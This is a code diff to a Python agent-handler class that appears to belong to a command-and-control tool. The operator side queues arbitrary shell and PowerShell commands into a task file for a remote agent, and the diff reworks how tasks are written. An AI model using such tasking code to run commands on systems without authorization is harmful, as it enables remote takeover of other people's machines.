@@ -26,6 +26,13 @@ class Agent:
         if not os.path.exists(self.path):
             os.mkdir(self.path)
 
+        if not os.path.exists(self.tasks_path):
+            with open(self.tasks_path, "w") as f:
+                f.write("$")
+                f.close()
+                # f = open(self.tasks_path, "w")
+                # f.close()
+
         self.menu = men.Menu(self.name)
         
         self.menu.registerCommand("cmd", "Execute a shell command.", "<command>")
@@ -41,14 +48,14 @@ class Agent:
     
     def write_task(self, task):
 
-        # if self.Type == "p":
-        #     task = "VALID " + task
-        #     # task = ENCRYPT(task, self.key)
-        # elif self.Type == "w":
-        #     task = task
-
-        with open(self.tasks_path, "a") as f:
-            f.write(task)
+        # Reads file into memory and prepends file with new task.
+        # Each task is inserted as beginning of file, as initiate looks for end of file
+        # indicator which is "$"
+        with open(self.tasks_path, 'r+') as f:
+            content = f.read()
+            f.seek(0, 0)
+            f.write(task.rstrip('\r\n') + '\n' + content)
+            f.close
 
     def clearTasks(self):
 
@@ -89,7 +96,7 @@ class Agent:
         else:
 
             command = " ".join(args)
-            task = f"22 0 {command}\n"
+            task = f"#22 0 {command}\n"
             self.write_task(task)
 
     def powershell(self, args):
